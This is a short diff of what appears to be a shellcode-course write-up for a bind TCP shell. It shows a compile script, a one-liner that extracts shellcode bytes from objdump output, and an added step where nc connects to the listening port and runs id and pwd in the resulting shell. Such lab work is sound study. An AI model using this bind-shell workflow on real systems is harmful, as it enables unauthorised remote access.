@@ -11,7 +11,6 @@ $ cat compile_asm.sh
   
 $ ./compile_asm.sh bind_tcp_shell
 
-
 $ cat get_shellcode.sh 
     #!/bin/bash
     for i in $(objdump -d $1 |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
@@ -30,3 +29,9 @@ $./bind_tcp_shell
 
 3.- Connect and get the shell
 
+  MacBook-Pro:~$ nc 192.168.1.41 8208
+  id  
+  uid=1002(snow) gid=1002(snow) groups=1002(snow),4(adm),27(sudo),109(lpadmin),124(sambashare)
+  pwd
+  /home/snow/SLAE
+  exit
